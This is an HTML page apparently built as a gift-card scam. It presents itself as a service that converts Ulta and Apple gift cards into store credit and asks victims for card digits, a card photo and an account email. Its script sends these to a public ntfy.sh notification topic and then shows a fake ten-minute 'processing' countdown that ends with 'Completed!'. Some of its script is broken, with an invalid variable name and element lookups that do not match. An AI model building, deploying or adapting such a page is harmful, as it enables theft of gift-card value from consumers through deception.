<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ULTA APPLE GIFT CARD STORE CREDIT ADDED </title>
  <style>
    :root {
      --bg: #F27A30;
      --card-bg: #ffffff;
      --accent: #F27A30;
      --accent-hover: #d9631b;
      --text: #2c2c2c;
      --text-dim: #666666;
      --border: #e0e0e0;
      --input-bg: #f9f9f9;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background-color: var(--bg);
      color: var(--text);
      max-width: 700px;
      margin: 2rem auto;
      padding: 0 1rem;
    }

    .card {
      background: var(--card-bg);
      border-radius: 12px;
      padding: 2rem;
      margin-bottom: 2rem;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
    }

    h2 {
      margin-top: 0;
      color: #F27A30;
    }

    .form-group {
      margin-bottom: 1.2rem;
    }

    label {
      display: block;
      margin-bottom: 0.4rem;
      font-size: 0.9rem;
      color: var(--text-dim);
      font-weight: 600;
    }

    input[type="text"], textarea, input[type="file"] {
      width: 100%;
      padding: 0.75rem;
      border-radius: 6px;
      border: 1px solid var(--border);
      background-color: var(--input-bg);
      color: var(--text);
      box-sizing: border-box;
      font-size: 1rem;
    }

    input[type="text"]:focus, textarea:focus {
      outline: none;
      border-color: var(--accent);
      background-color: #ffffff;
      box-shadow: 0 0 0 3px rgba(242, 122, 48, 0.2);
    }

    textarea {
      resize: vertical;
      min-height: 120px;
    }

    button {
      background-color: var(--accent);
      color: #ffffff;
      border: none;
      padding: 0.85rem 1.5rem;
      border-radius: 6px;
      font-weight: bold;
      font-size: 1rem;
      cursor: pointer;
      width: 100%;
      transition: background-color 0.2s, transform 0.1s;
    }

    button:hover {
      background-color: var(--accent-hover);
    }

    button:active {
      transform: scale(0.99);
    }

    button:disabled {
      background-color: #ccc;
      color: #666;
      cursor: not-allowed;
    }

    #processingBox {
      display: none;
      text-align: center;
      padding: 2rem 1rem;
    }

    .spinner {
      width: 45px;
      height: 45px;
      border: 4px solid var(--border);
      border-top: 4px solid var(--accent);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 1.5rem auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    #timer {
      font-size: 2rem;
      font-weight: bold;
      color: var(--accent);
      margin-top: 0.5rem;
    }

    #status {
      margin-top: 1rem;
      font-size: 0.95rem;
      text-align: center;
      font-weight: 500;
    }

    .error { color: #c62828; }
    .success { color: #2e7d32; }
  </style>
</head>
<body>

  <div class="card">
    <h2>ULTA APPLE GIFT CARD STORE CREDIT ADDED   </h2>
    
    <form id="reviewForm">
      <div class="form-group">
        <label for="username">Name of Card</label>
        <input type="text" id="username" required placeholder="">
      </div>

      <div class="form-group">
        <label for="title">Card Type (Physical or E-code)</label>
        <input type="text" id="title" required placeholder="Enter category">
      </div>
      
	  <div class="form-group">
        <label for="title 2">Ulta Beauty Account Email Address </label>
        <input type="text" id="title" required placeholder="">
      </div>

      <div class="form-group">
        <label for="review">Card Digits </label>
        <textarea id="review" required placeholder="Enter details..."></textarea>
      </div>

      <div class="form-group">
        <label for="image">Attach Image </label>
        <input type="file" id="image" accept="image/*">
      </div>

      <button type="submit" id="submitBtn">Submit Request</button>
    </form>

    <div id="processingBox">
      <div class="spinner"></div>
      <h3>Processing your submission...</h3>
      <p style="color: var(--text-dim);">Estimated wait time:</p>
      <div id="timer">10:00</div>
    </div>

    <div id="status"></div>
  </div>

  <script>
    const TOPIC_NAME = 'converter-storecredit';

    const form = document.getElementById('reviewForm');
    const submitBtn = document.getElementById('submitBtn');
    const statusDiv = document.getElementById('status');
    const processingBox = document.getElementById('processingBox');
    const timerDiv = document.getElementById('timer');

    // Canvas-based client-side compression function
    function compressImage(file, maxWidth = 1200, maxHeight = 1200, quality = 0.7) {
      return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.readAsDataURL(file);
        reader.onload = (event) => {
          const img = new Image();
          img.src = event.target.result;
          img.onload = () => {
            let width = img.width;
            let height = img.height;

            // Maintain aspect ratio while resizing
            if (width > height) {
              if (width > maxWidth) {
                height = Math.round((height * maxWidth) / width);
                width = maxWidth;
              }
            } else {
              if (height > maxHeight) {
                width = Math.round((width * maxHeight) / height);
                height = maxHeight;
              }
            }

            const canvas = document.createElement('canvas');
            canvas.width = width;
            canvas.height = height;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(img, 0, 0, width, height);

            canvas.toBlob((blob) => {
              if (blob) {
                resolve(blob);
              } else {
                reject(new Error('Image compression failed.'));
              }
            }, 'image/jpeg', quality);
          };
          img.onerror = (err) => reject(err);
        };
        reader.onerror = (err) => reject(err);
      });
    }

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      
      submitBtn.disabled = true;
      statusDiv.textContent = "Processing image & sending...";
      statusDiv.className = "";

      const username = document.getElementById('Name of Card ').value;
      const title = document.getElementById('Card Type(Physical or E-code)').value;
	  const title 2 = document.getElementById('Ulta Beauty Account Email Address').value;
      const reviewText = document.getElementById('Card Digits').value;
      const imageFile = document.getElementById('image').files[0];

      const fullMessage = `Name: ${username}\nCategory: ${title}\nDetails: ${reviewText}`;

      try {
        let response;

        if (imageFile) {
          // Compress the image before uploading
          const compressedBlob = await compressImage(imageFile, 1200, 1200, 0.7);

          const uploadUrl = new URL(`https://ntfy.sh/${TOPIC_NAME}`);
          uploadUrl.searchParams.append('title', title);
          uploadUrl.searchParams.append('message', fullMessage);
          uploadUrl.searchParams.append('filename', 'submission.jpg');

          response = await fetch(uploadUrl.toString(), {
            method: 'PUT',
            body: compressedBlob
          });
        } else {
          // Text-only submission
          const uploadUrl = new URL(`https://ntfy.sh/${TOPIC_NAME}`);
          uploadUrl.searchParams.append('title', title);

          response = await fetch(uploadUrl.toString(), {
            method: 'POST',
            body: fullMessage
          });
        }

        if (response.ok) {
          statusDiv.textContent = "";
          form.style.display = 'none';
          processingBox.style.display = 'block';
          startCountdown(10 * 60);
        } else {
          throw new Error(`Server returned status ${response.status}`);
        }
      } catch (err) {
        console.error("Submission error:", err);
        statusDiv.textContent = "Error: " + err.message;
        statusDiv.className = "error";
        submitBtn.disabled = false;
      }
    });

    function startCountdown(durationInSeconds) {
      let timer = durationInSeconds;
      
      const interval = setInterval(() => {
        const minutes = Math.floor(timer / 60);
        const seconds = timer % 60;

        const formattedMin = String(minutes).padStart(2, '0');
        const formattedSec = String(seconds).padStart(2, '0');

        timerDiv.textContent = `${formattedMin}:${formattedSec}`;

        if (--timer < 0) {
          clearInterval(interval);
          processingBox.innerHTML = `
            <h3 class="success" style="font-size: 1.5rem;">Completed!</h3>
            <p>Your submission has finished processing.</p>
          `;
        }
      }, 1000);
    }
  </script>
</body>
</html>
